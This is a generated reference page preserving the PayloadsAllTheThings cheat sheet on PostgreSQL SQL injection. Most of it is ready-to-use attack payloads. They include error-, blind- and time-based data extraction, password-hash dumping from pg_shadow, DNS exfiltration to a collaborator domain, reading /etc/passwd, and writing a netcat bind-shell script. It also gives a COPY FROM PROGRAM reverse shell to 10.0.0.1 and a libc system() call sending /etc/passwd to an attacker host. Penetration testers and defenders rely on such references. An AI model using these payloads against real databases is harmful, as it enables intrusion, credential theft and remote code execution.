---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# PostgreSQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-postgresql-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/PostgreSQL Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PostgreSQL Injection](../../topics/sql-injection/postgresql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-postgresql-injection |
| name | PostgreSQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md |

## Preserved Source Material

````yaml
_body: "# PostgreSQL Injection\n\n> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit\
  \ improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.\n\n## Summary\n\n*\
  \ [PostgreSQL Comments](#postgresql-comments)\n* [PostgreSQL Enumeration](#postgresql-enumeration)\n* [PostgreSQL Methodology](#postgresql-methodology)\n\
  * [PostgreSQL Error Based](#postgresql-error-based)\n    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)\n* [PostgreSQL\
  \ Blind](#postgresql-blind)\n    * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)\n\
  * [PostgreSQL Time Based](#postgresql-time-based)\n* [PostgreSQL Out of Band](#postgresql-out-of-band)\n* [PostgreSQL Stacked\
  \ Query](#postgresql-stacked-query)\n* [PostgreSQL File Manipulation](#postgresql-file-manipulation)\n    * [PostgreSQL\
  \ File Read](#postgresql-file-read)\n    * [PostgreSQL File Write](#postgresql-file-write)\n* [PostgreSQL Command Execution](#postgresql-command-execution)\n\
  \    * [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)\n    * [Using libc.so.6](#using-libcso6)\n* [PostgreSQL\
  \ WAF Bypass](#postgresql-waf-bypass)\n    * [Alternative to Quotes](#alternative-to-quotes)\n* [PostgreSQL Privileges](#postgresql-privileges)\n\
  \    * [PostgreSQL List Privileges](#postgresql-list-privileges)\n    * [PostgreSQL Superuser Role](#postgresql-superuser-role)\n\
  * [References](#references)\n\n## PostgreSQL Comments\n\n| Type                | Comment |\n| ------------------- | -------\
  \ |\n| Single-Line Comment | `--`    |\n| Multi-Line Comment  | `/**/`  |\n\n## PostgreSQL Enumeration\n\n| Description\
  \            | SQL Query                               |\n| ---------------------- | ---------------------------------------\
  \ |\n| DBMS version           | `SELECT version()`                      |\n| Database Name          | `SELECT CURRENT_DATABASE()`\
  \             |\n| Database Schema        | `SELECT CURRENT_SCHEMA()`               |\n| List PostgreSQL Users  | `SELECT\
  \ usename FROM pg_user`           |\n| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |\n| List DB Administrators\
  \ | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |\n| Current User           | `SELECT user;`                  \
  \        |\n| Current User           | `SELECT current_user;`                  |\n| Current User           | `SELECT session_user;`\
  \                  |\n| Current User           | `SELECT usename FROM pg_user;`          |\n| Current User           | `SELECT\
  \ getpgusername();`               |\n\n## PostgreSQL Methodology\n\n| Description            | SQL Query               \
  \                     |\n| ---------------------- | -------------------------------------------- |\n| List Schemas     \
  \      | `SELECT DISTINCT(schemaname) FROM pg_tables` |\n| List Databases         | `SELECT datname FROM pg_database`  \
  \          |\n| List Tables            | `SELECT table_name FROM information_schema.tables` |\n| List Tables           \
  \ | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |\n| List Tables            |\
  \ `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |\n| List Columns           | `SELECT column_name\
  \ FROM information_schema.columns WHERE table_name='data_table'` |\n\n## PostgreSQL Error Based\n\n| Name         | Payload\
  \         |\n| ------------ | --------------- |\n| CAST | `AND 1337=CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC)\
  \ -- -` |\n| CAST | `AND (CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC)) -- -` |\n| CAST | `AND CAST((SELECT\
  \ version()) AS INT)=1337 -- -` |\n| CAST | `AND (SELECT version())::int=1 -- -` |\n\n```sql\nCAST(chr(126)||VERSION()||chr(126)\
  \ AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS\
  \ NUMERIC)--\nCAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET\
  \ data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126)\
  \ AS NUMERIC)\n```\n\n```sql\n' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT\
  \ table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name\
  \ FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT\
  \ data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n```\n\n### PostgreSQL XML Helpers\n\n```sql\n\
  SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n```\n\nThe `query_to_xml`\
  \ above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based)\
  \ technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.\n\n```sql\nSELECT database_to_xml(true,true,'');\
  \ -- dump the current database to XML\nSELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n\
  ```\n\nNote, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause\
  \ a slow down or denial of service condition.\n\n## PostgreSQL Blind\n\n### PostgreSQL Blind With Substring Equivalent\n\
  \n| Function    | Example                                         |\n| ----------- | -----------------------------------------------\
  \ |\n| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |\n| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`\
  \        |\n| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |\n\nExamples:\n\n```sql\n' and substr(version(),1,10)\
  \ = 'PostgreSQL' and '1  -- TRUE\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE\n```\n\n## PostgreSQL Time\
  \ Based\n\n### Identify Time Based\n\n```sql\nselect 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from\
  \ pg_sleep(5))\n```\n\n### Database Dump Time Based\n\n```sql\nselect case when substring(datname,1,1)='1' then pg_sleep(5)\
  \ else pg_sleep(0) end from pg_database limit 1\n```\n\n### Table Dump Time Based\n\n```sql\nselect case when substring(table_name,1,1)='a'\
  \ then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n```\n\n### Columns Dump Time Based\n\n```sql\n\
  select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when\
  \ substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n```\n\
  \n```sql\nAND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'\nAND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT\
  \ COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n```\n\n## PostgreSQL Out of Band\n\nOut-of-band SQL injections in\
  \ PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`,\
  \ or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere,\
  \ which the attacker can monitor and intercept.\n\n```sql\ndeclare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT\
  \ YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\n\
  END;\n$$ language plpgsql security definer;\nSELECT f();\n```\n\n## PostgreSQL Stacked Query\n\nUse a semi-colon \"`;`\"\
  \ to add another query\n\n```sql\nSELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--\n```\n\n## PostgreSQL File Manipulation\n\
  \n### PostgreSQL File Read\n\nNOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`.\
  \ Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)\
  \ commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.\n\
  \n* Using `pg_read_file`, `pg_ls_dir`\n\n    ```sql\n    select pg_ls_dir('./');\n    select pg_read_file('PG_VERSION',\
  \ 0, 200);\n    ```\n\n* Using `COPY`\n\n    ```sql\n    CREATE TABLE temp(t TEXT);\n    COPY temp FROM '/etc/passwd';\n\
  \    SELECT * FROM temp limit 1 offset 0;\n    ```\n\n* Using `lo_import`\n\n    ```sql\n    SELECT lo_import('/etc/passwd');\
  \ -- will create a large object from the file and return the OID\n    SELECT lo_get(16420); -- use the OID returned from\
  \ the above\n    SELECT * from pg_largeobject; -- or just get all the large objects and their data\n    ```\n\n### PostgreSQL\
  \ File Write\n\n* Using `COPY`\n\n    ```sql\n    CREATE TABLE nc (t TEXT);\n    INSERT INTO nc(t) VALUES('nc -lvvp 2346\
  \ -e /bin/bash');\n    SELECT * FROM nc;\n    COPY nc(t) TO '/tmp/nc.sh';\n    ```\n\n* Using `COPY` (one-line)\n\n    ```sql\n\
  \    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n    ```\n\n* Using `lo_from_bytea`, `lo_put` and\
  \ `lo_export`\n\n    ```sql\n    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with\
  \ OID 43210 and some data\n    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\n\
  \    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n    ```\n\n## PostgreSQL Command Execution\n\
  \n### Using COPY TO/FROM PROGRAM\n\nInstallations running Postgres 9.3 and above have functionality which allows for the\
  \ superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.\n\n```sql\n\
  COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';\nCOPY (SELECT '') to PROGRAM 'nslookup\
  \ [BURP_COLLABORATOR_DOMAIN_CALLBACK]'\n```\n\n```sql\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo\
  \ /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';\n```\n\n### Using libc.so.6\n\n```sql\nCREATE OR REPLACE\
  \ FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat\
  \ /etc/passwd | nc <attacker IP> <attacker port>');\n```\n\n## PostgreSQL WAF Bypass\n\n### Alternative to Quotes\n\n| Payload\
  \            | Technique |\n| ------------------ | --------- |\n| `SELECT CHR(65)\\|\\|CHR(66)\\|\\|CHR(67);` | String from\
  \ `CHR()` |\n| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |\n\n## PostgreSQL Privileges\n\n### PostgreSQL\
  \ List Privileges\n\nRetrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog`\
  \ and `information_schema`.\n\n```sql\nSELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND\
  \ table_schema NOT IN ('pg_catalog', 'information_schema');\n```\n\n### PostgreSQL Superuser Role\n\n```sql\nSHOW is_superuser;\
  \ \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n```\n\n## References\n\
  \n* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://web.archive.org/web/20250812102408/https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)\n\
  * [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://web.archive.org/web/20200927000909/https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)\n\
  * [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://web.archive.org/web/20250803101126/https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)\n\
  * [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](https://web.archive.org/web/20260302153609/https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)\n\
  * [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://web.archive.org/web/20201001043242/https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)\n\
  * [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://web.archive.org/web/20240613225549/https://hackerone.com/reports/181803)\n\
  * [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://web.archive.org/web/20251210040037/https://pulsesecurity.co.nz/articles/postgres-sqli)"
_relative_path: SQL Injection/PostgreSQL Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/PostgreSQL Injection.md
````
